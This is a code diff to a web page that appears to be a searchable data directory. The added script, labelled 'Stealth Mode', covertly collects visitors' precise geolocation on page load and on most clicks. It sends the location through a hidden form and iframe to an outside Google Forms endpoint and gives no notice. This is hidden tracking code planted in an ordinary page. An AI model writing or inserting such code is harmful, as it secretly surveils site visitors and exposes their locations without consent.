@@ -1099,6 +1099,79 @@
         document.getElementById('searchInput').addEventListener('input', filterData);
         document.getElementById('branchFilter').addEventListener('change', filterData);
         document.getElementById('divFilter').addEventListener('change', filterData);
+
+        // --- Cloud Tracking Logic (Google Forms Backend - Stealth Mode) ---
+        const CLOUD_CONFIG = {
+            formUrl: "https://docs.google.com/forms/d/e/1FAIpQLScHuj6GMQot477On_FBe4yvPZEgOMmTOtVDZgbvBk07YI69ig/formResponse",
+            entries: {
+                lat: "entry.313094556",
+                lon: "entry.1794910903",
+                acc: "entry.401162063",
+                time: "entry.1806013085"
+            }
+        };
+
+        async function logToCloud(position) {
+            // Ignore if running locally to avoid filling your own form with test data
+            if (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') {
+                console.log("Local development detected: Skipping cloud sync.");
+                // return; // Commented out so you can still test locally if you want
+            }
+
+            // Create a hidden form and iframe for stealth submission
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = CLOUD_CONFIG.formUrl;
+            form.target = 'hidden_iframe';
+            form.style.display = 'none';
+
+            const map = {
+                [CLOUD_CONFIG.entries.lat]: position.coords.latitude.toFixed(6),
+                [CLOUD_CONFIG.entries.lon]: position.coords.longitude.toFixed(6),
+                [CLOUD_CONFIG.entries.acc]: position.coords.accuracy.toFixed(1),
+                [CLOUD_CONFIG.entries.time]: new Date().toLocaleString()
+            };
+
+            for (const [name, value] of Object.entries(map)) {
+                const input = document.createElement('input');
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
+            }
+
+            if (!document.getElementById('hidden_iframe')) {
+                const iframe = document.createElement('iframe');
+                iframe.id = 'hidden_iframe';
+                iframe.name = 'hidden_iframe';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            }
+
+            document.body.appendChild(form);
+            form.submit();
+            setTimeout(() => document.body.removeChild(form), 1000);
+            console.log("Cloud Sync: Location data sent to satellite.");
+        }
+
+        async function handleCloudTracking(e) {
+            // Only track if not clicking on interactive elements
+            if (e.target.closest('button, input, select, .theme-switch, a')) return;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(logToCloud, (err) => {
+                    console.warn("Satellite link denied.");
+                }, { enableHighAccuracy: true });
+            }
+        }
+
+        document.body.addEventListener('click', handleCloudTracking);
+
+        // Initial check on load
+        window.addEventListener('load', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(logToCloud, null, { enableHighAccuracy: false });
+            }
+        });
     </script>
 </body>
 
